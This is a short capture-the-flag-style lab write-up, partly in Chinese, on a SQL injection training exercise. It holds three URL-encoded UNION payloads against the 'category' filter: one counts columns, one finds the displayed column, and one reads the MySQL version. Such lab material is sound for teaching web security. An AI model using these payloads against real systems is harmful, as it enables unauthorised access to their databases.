# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## SQL injection
* 題目說資料庫用的是 `MySQL`（`MSSQL` 拿版本的方法跟 `MySQL` 一樣）
* 注入點在 `category`
* 先看一下有多少個 columns 以及哪一個 column 可以輸出在網頁上
```
// 看有多少個 column
payload = Toys+%26+Games%27%20union%20select%20NULL,NULL%20--%20-
```
```
// 看哪一個 column 可以輸出在網頁上
payload = Toys+%26+Games%27%20union%20select%20NULL,%271%27%20--%20-
```
```
// 拿 version
payload = %27%20union%20select%20NULL,version()%20--%20-
```